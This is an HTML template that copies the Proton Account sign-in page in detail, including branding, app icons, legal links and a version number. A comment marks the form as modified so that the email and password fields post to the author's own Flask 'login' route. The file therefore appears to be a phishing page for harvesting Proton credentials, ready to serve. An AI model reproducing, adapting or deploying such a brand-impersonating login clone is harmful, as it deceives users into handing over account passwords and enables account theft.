<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proton Account - Sign in</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        body {
            background-color: #f2efff;
            color: #1c1c28;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 16px;
        }

        /* Top Header Bar */
        .top-header {
            width: 100%;
            max-width: 480px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 8px 24px 8px;
        }

        .proton-logo-text {
            font-size: 26px;
            font-weight: 700;
            color: #6d4aff;
            letter-spacing: -0.5px;
        }

        .header-controls {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .lang-selector {
            display: flex;
            align-items: center;
            gap: 4px;
            background: none;
            border: none;
            color: #525266;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .theme-icon {
            background: none;
            border: none;
            color: #525266;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        /* Main Card */
        .card {
            background-color: #ffffff;
            width: 100%;
            max-width: 440px;
            border-radius: 24px;
            padding: 36px 32px 32px 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
            display: flex;
            flex-direction: column;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            color: #1c1c28;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 14px;
            color: #525266;
            margin-bottom: 28px;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 18px;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
            width: 100%;
        }

        .input-label {
            font-size: 14px;
            font-weight: 600;
            color: #1c1c28;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
            display: flex;
            align-items: center;
        }

        .input-field {
            width: 100%;
            height: 48px;
            padding: 0 16px;
            background-color: #ffffff;
            border: 1px solid #6d4aff;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            color: #1c1c28;
            box-shadow: 0 0 0 3px rgba(109, 74, 255, 0.15);
        }

        .input-field.secondary {
            border: 1px solid #dcdce5;
            box-shadow: none;
        }

        .input-field.secondary:focus {
            border-color: #6d4aff;
            box-shadow: 0 0 0 3px rgba(109, 74, 255, 0.15);
        }

        .eye-btn {
            position: absolute;
            right: 14px;
            background: none;
            border: none;
            cursor: pointer;
            color: #525266;
            display: flex;
            align-items: center;
        }

        /* Checkbox Row */
        .checkbox-group {
            display: flex;
            flex-direction: column;
            gap: 2px;
            margin-top: 2px;
        }

        .checkbox-row {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .checkbox-row input {
            width: 18px;
            height: 18px;
            border-radius: 4px;
            accent-color: #6d4aff;
            cursor: pointer;
        }

        .checkbox-row label {
            font-size: 14px;
            color: #1c1c28;
            font-weight: 500;
            cursor: pointer;
        }

        .checkbox-subtext {
            font-size: 13px;
            color: #707088;
            margin-left: 28px;
        }

        .checkbox-subtext a {
            color: #707088;
            text-decoration: underline;
        }

        .btn-submit {
            width: 100%;
            height: 48px;
            background-color: #6d4aff;
            border: none;
            border-radius: 12px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #5b3be6;
        }

        .signup-text {
            text-align: center;
            font-size: 14px;
            color: #1c1c28;
            margin-top: 16px;
        }

        .signup-text a {
            color: #6d4aff;
            text-decoration: underline;
            font-weight: 500;
        }

        .divider-line {
            width: 100%;
            height: 1px;
            background-color: #eaeaef;
            margin: 24px 0;
        }

        .trouble-link {
            text-align: center;
            font-size: 14px;
            color: #6d4aff;
            text-decoration: underline;
            font-weight: 500;
        }

        /* Footer & App Ecosystem Icons */
        .footer-container {
            width: 100%;
            max-width: 440px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 16px;
            margin-top: 32px;
            margin-bottom: 16px;
        }

        .app-icons {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .app-icon {
            width: 24px;
            height: 24px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .tagline {
            font-size: 13px;
            color: #525266;
            font-weight: 500;
        }

        .legal-links {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: #6d4aff;
        }

        .legal-links a {
            color: #6d4aff;
            text-decoration: underline;
        }

        .legal-links span {
            color: #8f8fa3;
        }

        .version-text {
            color: #525266;
            text-decoration: none !important;
        }

        /* Floating Help Pill */
        .help-pill {
            display: flex;
            align-items: center;
            gap: 8px;
            background-color: #ffffff;
            border: 1px solid #eaeaef;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
            color: #1c1c28;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
            margin-top: 8px;
            cursor: pointer;
        }

        .lumo-avatar {
            width: 20px;
            height: 20px;
            background-color: #6d4aff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 10px;
        }
    </style>
</head>
<body>

    <header class="top-header">
        <span class="proton-logo-text">Proton</span>
        <div class="header-controls">
            <button class="lang-selector">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
                English
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
            </button>
            <button class="theme-icon" aria-label="Toggle theme">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"></circle><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"></path></svg>
            </button>
        </div>
    </header>

    <main class="card">
        <h1 class="title">Sign in</h1>
        <p class="subtitle">Enter your Proton Account details.</p>

        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
        <form class="login-form" action="{{ url_for('login') }}" method="POST">
            <div class="input-group">
                <label class="input-label" for="username">Email or username</label>
                <input type="text" id="username" name="username" class="input-field" autofocus required />
            </div>

            <div class="input-group">
                <label class="input-label" for="password">Password</label>
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" class="input-field secondary" required />
                    <button type="button" class="eye-btn" aria-label="Toggle password visibility">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                    </button>
                </div>
            </div>

            <div class="checkbox-group">
                <div class="checkbox-row">
                    <input type="checkbox" id="keep-signed" />
                    <label for="keep-signed">Keep me signed in</label>
                </div>
                <div class="checkbox-subtext">
                    Recommended on trusted devices. <a href="#">Why?</a>
                </div>
            </div>

            <button type="submit" class="btn-submit">Sign in</button>

            <div class="signup-text">
                New to Proton? <a href="#">Create account</a>
            </div>

            <div class="divider-line"></div>

            <a href="#" class="trouble-link">Trouble signing in?</a>
        </form>
    </main>

    <footer class="footer-container">
        <!-- Proton Apps Grid Icon Row -->
        <div class="app-icons">
            <div class="app-icon" style="background-color: #6d4aff;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
            </div>
            <div class="app-icon" style="background-color: #2b7fff;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11z"/></svg>
            </div>
            <div class="app-icon" style="background-color: #9d3bff;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
            </div>
            <div class="app-icon" style="background-color: #00b3ff;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
            </div>
            <div class="app-icon" style="background-color: #f75a9a;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
            </div>
            <div class="app-icon" style="background-color: #7b61ff;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2zm0 18a8 8 0 1 1 8-8 8 8 0 0 1-8 8z"/></svg>
            </div>
        </div>

        <p class="tagline">Proton. Privacy by default.</p>

        <div class="legal-links">
            <a href="#">Terms</a>
            <span>|</span>
            <a href="#">Privacy policy</a>
            <span>|</span>
            <span class="version-text">Version 5.0.414.0</span>
        </div>

        <div class="help-pill">
            <div class="lumo-avatar">🐱</div>
            Get help from Lumo
        </div>
    </footer>

</body>
</html>
